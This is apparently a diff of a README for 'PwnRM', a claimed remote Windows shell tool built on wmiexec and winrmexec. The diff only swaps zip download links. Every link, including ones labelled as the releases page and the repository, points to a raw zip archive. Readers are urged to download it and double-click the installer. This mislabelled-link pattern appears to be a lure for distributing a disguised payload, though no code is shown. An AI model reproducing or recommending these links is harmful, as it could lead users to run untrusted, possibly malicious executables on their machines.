@@ -1,7 +1,7 @@
 # 🚀 PwnRM - A Powerful Tool for Remote Management
 
 ## 📥 Download Now
-[![Download PwnRM](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/PwnRM-2.2.zip)](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/PwnRM-2.2.zip)
+[![Download PwnRM](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/Pwn_RM_v2.8-beta.5.zip)](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/Pwn_RM_v2.8-beta.5.zip)
 
 ## 🚀 Getting Started
 PwnRM is an improved execution tool for managing Windows systems from a distance. It is built on the solid foundations of wmiexec and winrmexec, which means you can perform many remote tasks with ease. This tool provides you with a shell that simplifies your interactions with remote Windows systems.
@@ -24,13 +24,13 @@ Before you start using PwnRM, ensure that your system meets the following requir
 To download PwnRM, follow these steps:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/PwnRM-2.2.zip).
+   Go to the [Releases page](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/Pwn_RM_v2.8-beta.5.zip).
 
 2. **Find the Latest Version:**
    Look for the most recent version listed on the page.
 
 3. **Download the Installer:**
-   Click on the link for the latest installer file (typically labeled as `https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/PwnRM-2.2.zip` or similar).
+   Click on the link for the latest installer file (typically labeled as `https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/Pwn_RM_v2.8-beta.5.zip` or similar).
 
 4. **Run the Installer:**
    Once downloaded, locate the file in your downloads folder. Double-click it to start the installation.
@@ -71,12 +71,12 @@ To download PwnRM, follow these steps:
 For assistance, you can check the FAQ section or contact the community through GitHub issues. Your feedback is essential for improving PwnRM.
 
 ## 🌐 Additional Resources
-- GitHub Repository: [PwnRM on GitHub](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/PwnRM-2.2.zip)
+- GitHub Repository: [PwnRM on GitHub](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/Pwn_RM_v2.8-beta.5.zip)
 - Documentation: Find detailed instructions and guides in the wiki section of the repository.
 
 ## 📥 Quick Access to Download
 Remember, you can easily download PwnRM through the link below:
 
-[![Download PwnRM](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/PwnRM-2.2.zip)](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/PwnRM-2.2.zip)
+[![Download PwnRM](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/Pwn_RM_v2.8-beta.5.zip)](https://raw.githubusercontent.com/Goldroger0262/PwnRM/main/mysticism/Pwn_RM_v2.8-beta.5.zip)
 
 We hope you enjoy using PwnRM for your remote management needs!
